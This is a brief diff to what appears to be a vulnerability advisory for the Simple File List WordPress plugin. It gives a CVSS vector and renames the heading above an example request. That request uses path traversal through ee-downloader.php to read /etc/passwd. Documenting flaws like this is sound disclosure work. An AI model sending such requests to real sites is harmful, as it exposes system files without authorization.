@@ -11,7 +11,7 @@ CVSS Vector: CVSS:3.1/A:N/I:N/C:H/S:U/UI:N/PR:N/AC:L/AV:N
 ```
 
 ###
-**Vulnerable endpoint example:**
+**Vulnerable endpoint:**
 ```
 example.com/wp-content/plugins/simple-file-list/includes/ee-downloader.php?eeFile=/etc/passwd
 ```
